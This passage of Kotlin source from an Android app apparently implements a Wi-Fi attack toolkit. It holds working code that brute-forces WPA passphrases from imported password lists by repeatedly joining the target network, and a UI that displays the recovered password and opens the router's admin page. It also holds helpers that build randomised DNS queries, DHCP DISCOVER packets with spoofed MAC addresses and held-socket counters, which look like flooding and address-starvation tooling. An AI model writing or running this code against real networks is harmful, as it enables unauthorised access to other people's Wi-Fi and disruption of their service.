                                color = MaterialTheme.colorScheme.primary,
                                fontWeight = FontWeight.ExtraBold,
                            )
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.WaitingConnection -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            CircularProgressIndicator()
                            Text(
                                text = stringResource(R.string.network_hub_waiting_title),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )
                            Text(
                                text = stringResource(R.string.network_hub_waiting_message, currentDialogNetwork.ssid),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.Started, HubDialogStage.BruteForce -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Text(
                                text = if (currentDialogStage == HubDialogStage.Started)
                                    stringResource(R.string.network_hub_started_title)
                                    else stringResource(R.string.wifi_brute_force_active),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                            )

                            if (currentDialogStage == HubDialogStage.BruteForce) {
                                Text(
                                    text = stringResource(R.string.wifi_testing, currentBrutePassword),
                                    style = MaterialTheme.typography.titleMedium,
                                    color = MaterialTheme.colorScheme.primary,
                                    fontWeight = FontWeight.Bold
                                )
                                LinearProgressIndicator(
                                    modifier = Modifier.fillMaxWidth().height(4.dp).clip(RoundedCornerShape(2.dp)),
                                    color = MaterialTheme.colorScheme.primary
                                )
                            }

                            if (currentDialogStage == HubDialogStage.BruteForce && bruteForceSuccess) {
                                Column(
                                    modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
                                    horizontalAlignment = Alignment.CenterHorizontally,
                                    verticalArrangement = Arrangement.spacedBy(16.dp)
                                ) {
                                    Icon(
                                        Icons.Filled.CheckCircle,
                                        null,
                                        tint = Color.Green,
                                        modifier = Modifier.size(64.dp)
                                    )
                                    Text(
                                        text = stringResource(R.string.wifi_bruteforce_successful),
                                        style = MaterialTheme.typography.headlineSmall,
                                        color = Color.Green,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Surface(
                                        color = Color.Black.copy(alpha = 0.8f),
                                        shape = RoundedCornerShape(12.dp),
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        Column(
                                            modifier = Modifier.padding(16.dp),
                                            horizontalAlignment = Alignment.CenterHorizontally
                                        ) {
                                        Text(
                                            text = stringResource(R.string.wifi_password_label),
                                                style = MaterialTheme.typography.labelMedium,
                                                color = Color.White.copy(alpha = 0.6f)
                                            )
                                            Text(
                                                text = foundPassword,
                                                style = MaterialTheme.typography.headlineMedium,
                                                fontWeight = FontWeight.ExtraBold,
                                                color = Color.Green,
                                                textAlign = TextAlign.Center
                                            )
                                        }
                                    }
                                }
                            } else {
                                Text(
                                    text = stringResource(R.string.network_hub_logs_title),
                                    style = MaterialTheme.typography.titleMedium,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                )
                                if (sendLogs.isEmpty()) {
                                    Text(
                                        text = stringResource(R.string.network_hub_log_prepare),
                                        style = MaterialTheme.typography.bodyMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                                    )
                                } else {
                                    Surface(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .height(200.dp),
                                        shape = RoundedCornerShape(12.dp),
                                        color = Color.Black.copy(alpha = 0.8f)
                                    ) {
                                        LazyColumn(
                                            modifier = Modifier
                                                .fillMaxSize()
                                                .padding(12.dp),
                                            contentPadding = PaddingValues(4.dp),
                                            reverseLayout = true
                                        ) {
                                            items(sendLogs.size) { index ->
                                                Text(
                                                    text = sendLogs[sendLogs.size - 1 - index],
                                                    style = MaterialTheme.typography.bodyMedium,
                                                    color = if (currentDialogStage == HubDialogStage.BruteForce) Color.Green else Color(0xFFFF1744),
                                                    modifier = Modifier.padding(vertical = 2.dp)
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth(),
                                colors = androidx.compose.material3.ButtonDefaults.filledTonalButtonColors(
                                    containerColor = MaterialTheme.colorScheme.primary,
                                    contentColor = MaterialTheme.colorScheme.onPrimary
                                )
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.AdminPanel -> {
                        val gatewayIp = getGatewayIpAddress(context)
                        if (gatewayIp != null) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(600.dp)
                                    .padding(0.dp)
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(horizontal = 16.dp, vertical = 12.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text(
                                        text = stringResource(R.string.network_hub_admin_panel),
                                        style = MaterialTheme.typography.titleLarge,
                                        fontWeight = FontWeight.Bold,
                                        color = MaterialTheme.colorScheme.onSurface
                                    )
                                    DolphyIconButton(onClick = { closeDialog() }) {
                                        Icon(Icons.Filled.Close, contentDescription = null, tint = MaterialTheme.colorScheme.onSurface)
                                    }
                                }
                                AndroidView(
                                    factory = { ctx ->
                                        WebView(ctx).apply {
                                            settings.javaScriptEnabled = true
                                            settings.loadWithOverviewMode = true
                                            settings.useWideViewPort = true
                                            settings.builtInZoomControls = true
                                            settings.displayZoomControls = false
                                            settings.domStorageEnabled = true
                                            webViewClient = WebViewClient()
                                            loadUrl("http://$gatewayIp")
                                        }
                                    },
                                    modifier = Modifier.fillMaxSize()
                                )
                            }
                        } else {
                            Column(
                                modifier = Modifier.padding(24.dp),
                                horizontalAlignment = Alignment.CenterHorizontally,
                                verticalArrangement = Arrangement.spacedBy(16.dp)
                            ) {
                                Icon(
                                    imageVector = Icons.Filled.WifiOff,
                                    contentDescription = null,
                                    tint = MaterialTheme.colorScheme.error,
                                    modifier = Modifier.size(48.dp)
                                )
                                Text(
                                    text = if (AppLocale.isVietnamese(context)) "Chưa kết nối Wi-Fi" else "No Wi-Fi connection",
                                    style = MaterialTheme.typography.headlineSmall,
                                    fontWeight = FontWeight.Bold,
                                    color = MaterialTheme.colorScheme.error
                                )
                                Text(
                                    text = if (AppLocale.isVietnamese(context)) "Hãy kết nối vào mạng Wi-Fi trước" else "Connect to a Wi-Fi network first",
                                    style = MaterialTheme.typography.bodyLarge,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                                com.droid.dolphy.AccentButton(
                                    onClick = { closeDialog() },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text(stringResource(R.string.cancel))
                                }
                            }
                        }
                    }

                    HubDialogStage.Error -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Filled.Close,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.error,
                                modifier = Modifier.size(48.dp)
                            )
                            Text(
                                text = stringResource(R.string.network_hub_error_title),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.error,
                            )
                            Text(
                                text = stringResource(R.string.network_hub_error_message),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            com.droid.dolphy.AccentButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }
                }
            }
        }
    }

    if (showPasswordDialog) {
        BrutePasswordDialog(
            passwordGroups = passwordGroups,
            onImport = { fileImportLauncher.launch("text/plain") },
            onDismiss = { showPasswordDialog = false },
            onSave = { saveGroups(passwordGroups) }
        )
    }
}

private fun currentWifiSsid(wifiManager: WifiManager): String? {
    return try {
        val raw = wifiManager.connectionInfo?.ssid?.trim('"').orEmpty()
        if (raw.isEmpty() || raw == "<unknown ssid>") null else raw
    } catch (_: Exception) {
        null
    }
}


private fun isFullyConnectedToSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
    return try {
        val info = wifiManager.connectionInfo ?: return false
        val ssid = info.ssid?.trim('"').orEmpty()
        if (ssid.isEmpty() || ssid == "<unknown ssid>" || ssid != cleanSsid) return false
        info.supplicantState == SupplicantState.COMPLETED
    } catch (_: Exception) {
        false
    }
}


private fun isBusyOnSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
    return try {
        val info = wifiManager.connectionInfo ?: return false
        val ssid = info.ssid?.trim('"').orEmpty()
        if (ssid != cleanSsid) return false
        when (info.supplicantState) {
            SupplicantState.COMPLETED,
            SupplicantState.ASSOCIATED,
            SupplicantState.ASSOCIATING,
            SupplicantState.AUTHENTICATING,
            SupplicantState.FOUR_WAY_HANDSHAKE,
            SupplicantState.GROUP_HANDSHAKE,
            -> true
            else -> false
        }
    } catch (_: Exception) {
        false
    }
}

private fun clearAppWifiSuggestions(wifiManager: WifiManager) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
    runCatching { wifiManager.removeNetworkSuggestions(emptyList()) }
}

private fun prepareRadioForBrute(wifiManager: WifiManager, cleanSsid: String) {
    clearAppWifiSuggestions(wifiManager)
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        runCatching { wifiManager.disconnect() }
    }
    waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
    Thread.sleep(800)
}

private fun settleAfterFailedAttempt(wifiManager: WifiManager, cleanSsid: String) {
    clearAppWifiSuggestions(wifiManager)
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        runCatching { wifiManager.disconnect() }
    }
    waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 10_000)
    Thread.sleep(1_200)
}

private fun waitUntilLeftTarget(wifiManager: WifiManager, cleanSsid: String, timeoutMs: Long) {
    val deadline = System.currentTimeMillis() + timeoutMs
    while (System.currentTimeMillis() < deadline) {
        if (!isBusyOnSsid(wifiManager, cleanSsid) && !isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            Thread.sleep(400)
            if (!isBusyOnSsid(wifiManager, cleanSsid)) return
        }
        Thread.sleep(300)
    }
}

private fun waitForStableConnection(
    wifiManager: WifiManager,
    cleanSsid: String,
    timeoutMs: Long,
    stableMs: Long = 1_500,
): Boolean {
    val deadline = System.currentTimeMillis() + timeoutMs
    var stableSince = -1L
    while (System.currentTimeMillis() < deadline) {
        if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            if (stableSince < 0) stableSince = System.currentTimeMillis()
            if (System.currentTimeMillis() - stableSince >= stableMs) {
                return true
            }
        } else {
            stableSince = -1L
        }
        Thread.sleep(300)
    }
    return false
}

private fun testWifiPassword(
    context: Context,
    wifiManager: WifiManager,
    ssid: String,
    password: String,
): Boolean {
    val cleanSsid = ssid.trim('"')
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        settleAfterFailedAttempt(wifiManager, cleanSsid)
    }
    if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
        return false
    }
    return when {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ->
            testPasswordViaSuggestion(context, wifiManager, cleanSsid, password)
        else ->
            testPasswordLegacy(wifiManager, cleanSsid, password)
    }
}

private fun testPasswordLegacy(wifiManager: WifiManager, cleanSsid: String, password: String): Boolean {
    var netId = -1
    var ok = false
    return try {
        @Suppress("DEPRECATION")
        val wifiConfig = android.net.wifi.WifiConfiguration().apply {
            SSID = "\"" + cleanSsid + "\""
            preSharedKey = "\"" + password + "\""
            allowedKeyManagement.set(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK)
            status = android.net.wifi.WifiConfiguration.Status.ENABLED
        }
        @Suppress("DEPRECATION")
        netId = wifiManager.addNetwork(wifiConfig)
        if (netId == -1) return false
        @Suppress("DEPRECATION")
        wifiManager.disconnect()
        Thread.sleep(500)
        @Suppress("DEPRECATION")
        if (!wifiManager.enableNetwork(netId, true)) return false
        @Suppress("DEPRECATION")
        wifiManager.reconnect()
        val deadline = System.currentTimeMillis() + 18_000
        var stableSince = -1L
        while (System.currentTimeMillis() < deadline) {
            val info = wifiManager.connectionInfo
            val good = info != null &&
                info.networkId == netId &&
                info.ssid?.trim('"') == cleanSsid &&
                info.supplicantState == SupplicantState.COMPLETED
            if (good) {
                if (stableSince < 0) stableSince = System.currentTimeMillis()
                if (System.currentTimeMillis() - stableSince >= 1_500) {
                    ok = true
                    break
                }
            } else {
                stableSince = -1L
            }
            Thread.sleep(300)
        }
        ok
    } catch (_: Exception) {
        false
    } finally {
        if (netId != -1 && !ok) {
            runCatching {
                @Suppress("DEPRECATION")
                wifiManager.removeNetwork(netId)
                @Suppress("DEPRECATION")
                wifiManager.saveConfiguration()
            }
            runCatching { wifiManager.disconnect() }
        }
    }
}

@androidx.annotation.RequiresApi(Build.VERSION_CODES.Q)
private fun testPasswordViaSuggestion(
    context: Context,
    wifiManager: WifiManager,
    cleanSsid: String,
    password: String,
): Boolean {
    var suggestion: WifiNetworkSuggestion? = null
    var success = false
    val connectivityManager =
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    var callback: ConnectivityManager.NetworkCallback? = null
    return try {
        clearAppWifiSuggestions(wifiManager)
        Thread.sleep(400)
        if (isBusyOnSsid(wifiManager, cleanSsid)) {
            runCatching { wifiManager.disconnect() }
            waitUntilLeftTarget(wifiManager, cleanSsid, 8_000)
        }
        if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            return false
        }
        val builder = WifiNetworkSuggestion.Builder()
            .setSsid(cleanSsid)
            .setWpa2Passphrase(password)
            .setIsAppInteractionRequired(false)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            builder.setPriority(Int.MAX_VALUE)
        }
        suggestion = builder.build()
        val addStatus = wifiManager.addNetworkSuggestions(listOf(suggestion!!))
        if (addStatus != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
            return false
        }
        callback = object : ConnectivityManager.NetworkCallback() {}
        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .build()
        runCatching { connectivityManager.registerNetworkCallback(request, callback!!) }
        success = waitForStableConnection(
            wifiManager = wifiManager,
            cleanSsid = cleanSsid,
            timeoutMs = 20_000,
            stableMs = 1_500,
        )
        success
    } catch (_: Exception) {
        false
    } finally {
        callback?.let { cb ->
            runCatching { connectivityManager.unregisterNetworkCallback(cb) }
        }
        if (!success) {
            suggestion?.let { s ->
                runCatching { wifiManager.removeNetworkSuggestions(listOf(s)) }
            }
            clearAppWifiSuggestions(wifiManager)
            if (isBusyOnSsid(wifiManager, cleanSsid)) {
                runCatching { wifiManager.disconnect() }
            }
        }

    }
}

@Composable
private fun BrutePasswordDialog(
    passwordGroups: MutableList<PasswordGroup>,
    onImport: () -> Unit,
    onDismiss: () -> Unit,
    onSave: () -> Unit
) {
    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(dismissOnClickOutside = true)
    ) {
        Surface(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(28.dp),
            color = MaterialTheme.colorScheme.surfaceContainerHighest,
            tonalElevation = 8.dp
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = stringResource(R.string.wifi_brute_force_passwords),
                        style = MaterialTheme.typography.headlineSmall,
                        fontWeight = FontWeight.Bold
                    )
                    DolphyIconButton(onClick = onImport) {
                        Icon(Icons.Filled.Add, contentDescription = stringResource(R.string.wifi_import_passwords), tint = MaterialTheme.colorScheme.primary)
                    }
                }

                Text(
                    text = stringResource(R.string.wifi_brute_force_desc),
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                Surface(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(240.dp),
                    shape = RoundedCornerShape(12.dp),
                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                ) {
                    LazyColumn(
                        modifier = Modifier.padding(vertical = 4.dp),
                        contentPadding = PaddingValues(4.dp),
                        verticalArrangement = Arrangement.spacedBy(4.dp)
                    ) {
                        itemsIndexed(passwordGroups, key = { _, group -> group.name }) { index, group ->
                            val count = group.passwords.size
                            val validCount = group.passwords.count { it.length >= 8 }
                            val canDismiss = group.isImported

                            val dismissState = rememberSwipeToDismissBoxState(
                                confirmValueChange = { value ->
                                    if (canDismiss && value == SwipeToDismissBoxValue.EndToStart) {
                                        passwordGroups.removeAt(index)
                                        onSave()
                                        true
                                    } else false
                                }
                            )
                            Box(modifier = Modifier.clip(RoundedCornerShape(12.dp))) {
                                SwipeToDismissBox(
                                    state = dismissState,
                                    backgroundContent = {
                                        if (canDismiss) {
                                            Box(
                                                modifier = Modifier
                                                    .fillMaxSize()
                                                    .clip(RoundedCornerShape(12.dp))
                                                    .background(Color(0xFFFF5252)),
                                                contentAlignment = Alignment.CenterEnd
                                            ) {
                                                Icon(
                                                    Icons.Default.Delete,
                                                    contentDescription = stringResource(R.string.cd_delete),
                                                    tint = Color.White,
                                                    modifier = Modifier.padding(end = 24.dp)
                                                )
                                            }
                                        }
                                    },
                                    enableDismissFromStartToEnd = false,
                                    enableDismissFromEndToStart = canDismiss,
                                ) {
                                MaterialCard(
                                    modifier = Modifier.fillMaxWidth(),
                                    accentColor = if (group.selected) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurface.copy(alpha = 0.3f),
                                    cornerRadius = 12.dp,
                                    contentPadding = 0.dp
                                ) {
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(12.dp),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(12.dp)
                                    ) {
                                        Checkbox(
                                            checked = group.selected,
                                            onCheckedChange = {
                                                group.selected = it
                                                onSave()
                                            }
                                        )
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                text = group.name,
                                                style = MaterialTheme.typography.titleMedium,
                                                fontWeight = FontWeight.Bold,
                                                color = MaterialTheme.colorScheme.onSurface
                                            )
                                            Text(
                                                text = stringResource(R.string.wifi_passwords_count, count, validCount),
                                                style = MaterialTheme.typography.bodySmall,
                                                color = MaterialTheme.colorScheme.onSurfaceVariant
                                            )
                                        }
                                        if (group.isImported) {
                                            Text(
                                                text = "imported",
                                                style = MaterialTheme.typography.labelSmall,
                                                color = MaterialTheme.colorScheme.primary
                                            )
                                        }
                                    }
                                }
                            }
                            }
                        }
                    }
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.End
                ) {
                    com.droid.dolphy.AccentButton(onClick = onDismiss) {
                        Text(stringResource(R.string.cd_close))
                    }
                }
            }
        }
    }
}


private fun dhcpIntToIpv4(value: Int): String? {
    if (value == 0) return null
    return try {
        val bytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array()
        InetAddress.getByAddress(bytes).hostAddress
    } catch (_: Exception) {
        null
    }
}

private fun getHubLocalIpv4(): String? {
    return try {
        val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
        for (intf in interfaces) {
            if (!intf.isUp || intf.isLoopback) continue
            val name = intf.name.lowercase(Locale.US)
            if (name.startsWith("wlan") || name.startsWith("ap") || name.startsWith("wifi") || name.startsWith("eth")) {
                for (addr in Collections.list(intf.inetAddresses)) {
                    if (addr.isLoopbackAddress) continue
                    val host = addr.hostAddress ?: continue
                    if (!host.contains(':')) return host
                }
            }
        }
        for (intf in interfaces) {
            if (!intf.isUp || intf.isLoopback) continue
            val name = intf.name.lowercase(Locale.US)
            if (name.startsWith("rmnet") || name.startsWith("ccmni") || name.startsWith("pdp") ||
                name.startsWith("tun") || name.startsWith("ppp") || name.startsWith("dummy")) continue
            for (addr in Collections.list(intf.inetAddresses)) {
                if (addr.isLoopbackAddress) continue
                val host = addr.hostAddress ?: continue
                if (host.contains(':')) continue
                return host
            }
        }
        null
    } catch (_: Exception) {
        null
    }
}

private fun readArpTable(): List<Pair<String, String>> {
    return readSystemNeighborTable().map { it.key to it.value }
}

private fun quickPortOpen(ip: String, port: Int, timeoutMs: Int): Boolean {
    return runCatching {
        Socket().use { s ->
            s.connect(InetSocketAddress(ip, port), timeoutMs)
            true
        }
    }.getOrDefault(false)
}


private fun buildDnsQuery(hostname: String, id: Int = (System.nanoTime() and 0xFFFF).toInt()): ByteArray {
    val header = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN)
    header.putShort((id and 0xFFFF).toShort())
    header.putShort(0x0100.toShort())
    header.putShort(1)
    header.putShort(0)
    header.putShort(0)
    header.putShort(0)
    val qname = java.io.ByteArrayOutputStream()
    hostname.split('.').forEach { label ->
        if (label.isEmpty()) return@forEach
        val bytes = label.toByteArray(Charsets.US_ASCII).take(63).toByteArray()
        qname.write(bytes.size)
        qname.write(bytes)
    }
    qname.write(0)
    val tail = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
    val qtype = if ((id and 1) == 0) 1 else 28
    tail.putShort(qtype.toShort())
    tail.putShort(1)
    return header.array() + qname.toByteArray() + tail.array()
}


private fun buildRandomRecursiveDnsQuery(random: java.util.Random): ByteArray {
    val id = random.nextInt(0x10000)
    val label = buildString(16) {
        repeat(10 + random.nextInt(6)) {
            append(('a'.code + random.nextInt(26)).toChar())
        }
    }
    val num = random.nextInt(1_000_000)
    val roots = arrayOf(
        "lan", "local", "home.arpa", "internal", "router.local"
    )
    val root = roots[random.nextInt(roots.size)]
    val host = when (random.nextInt(4)) {
        0 -> "$label$num.$root"
        1 -> "$label.$num.$root"
        2 -> "cdn-$label-$num.$root"
        else -> "r$num-$label.$root"
    }
    return buildDnsQuery(host, id)
}


private fun buildDhcpDiscover(): ByteArray {
    val buf = ByteArray(300)
    buf[0] = 1
    buf[1] = 1
    buf[2] = 6
    val xid = (System.nanoTime() and 0xFFFFFFFFL).toInt()
    buf[4] = (xid ushr 24).toByte()
    buf[5] = (xid ushr 16).toByte()
    buf[6] = (xid ushr 8).toByte()
    buf[7] = xid.toByte()
    buf[10] = 0x80.toByte()
    val rnd = java.util.Random()
    for (i in 0 until 6) buf[28 + i] = rnd.nextInt(256).toByte()
    buf[28] = ((buf[28].toInt() and 0xFE) or 0x02).toByte()
    buf[236] = 99
    buf[237] = 130.toByte()
    buf[238] = 83
    buf[239] = 99
    buf[240] = 53
    buf[241] = 1
    buf[242] = 1
    buf[243] = 55
    buf[244] = 4
    buf[245] = 1
    buf[246] = 3
    buf[247] = 6
    buf[248] = 15
    buf[249] = 255.toByte()
    return buf
}

private const val MAX_HELD_FDS = 700
private val heldFdCount = AtomicInteger(0)

private fun tryAcquireFd(): Boolean {
    while (true) {
        val current = heldFdCount.get()
        if (current >= MAX_HELD_FDS) return false
        if (heldFdCount.compareAndSet(current, current + 1)) return true
    }
}

private fun releaseFd() {
    heldFdCount.updateAndGet { maxOf(0, it - 1) }
}

private fun buildSsdpMsearch(st: String = "ssdp:all"): ByteArray {
    return ("M-SEARCH * HTTP/1.1\r\n" +
        "HOST: 239.255.255.250:1900\r\n" +
        "MAN: \"ssdp:discover\"\r\n" +
        "MX: 2\r\n" +
        "ST: $st\r\n\r\n").toByteArray(Charsets.US_ASCII)
}

private fun buildMdnsServiceQuery(id: Int): ByteArray {
    val header = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN)
    header.putShort((id and 0xFFFF).toShort())
    header.putShort(0)
    header.putShort(1)
    header.putShort(0)
    header.putShort(0)
    header.putShort(0)
    val qname = byteArrayOf(
        9, '_'.code.toByte(), 's'.code.toByte(), 'e'.code.toByte(), 'r'.code.toByte(),
        'v'.code.toByte(), 'i'.code.toByte(), 'c'.code.toByte(), 'e'.code.toByte(),
        's'.code.toByte(),
        7, '_'.code.toByte(), 'd'.code.toByte(), 'n'.code.toByte(), 's'.code.toByte(),
        '-'.code.toByte(), 's'.code.toByte(), 'd'.code.toByte(),
        4, '_'.code.toByte(), 'u'.code.toByte(), 'd'.code.toByte(), 'p'.code.toByte(),
        5, 'l'.code.toByte(), 'o'.code.toByte(), 'c'.code.toByte(), 'a'.code.toByte(),
        'l'.code.toByte(),
        0,
    )
    val tail = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
    tail.putShort(12)
    tail.putShort(1)
    return header.array() + qname + tail.array()
}

private fun buildSnmpGetNext(requestId: Int): ByteArray {
    return byteArrayOf(
        0x30.toByte(), 0x26.toByte(),
        0x02, 0x01, 0x01,
        0x04, 0x06, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63,
        0xA1.toByte(), 0x19.toByte(),
        0x02, 0x04,
        (requestId ushr 24).toByte(), (requestId ushr 16).toByte(),
        (requestId ushr 8).toByte(), requestId.toByte(),
        0x02, 0x01, 0x00,
        0x02, 0x01, 0x00,
        0x30, 0x0B,
        0x30, 0x09,
        0x06, 0x07, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01,
        0x05, 0x00,
    )
}
